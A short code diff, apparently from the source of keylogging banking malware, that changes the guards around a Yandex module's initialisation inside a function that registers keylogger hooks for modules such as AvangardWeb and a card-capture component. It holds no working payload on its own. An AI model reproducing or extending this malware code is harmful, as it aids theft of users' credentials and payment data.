@@ -318,9 +318,9 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp)
 		AvangardWeb::Init();
 	#endif
 
-//	#ifdef YandexModule
+	#ifdef YandexModule
 		YandexSearchJpg::Init();
-//	#endif
+	#endif
 
 	#ifdef CCModule
 		CC::Init(hashApp);
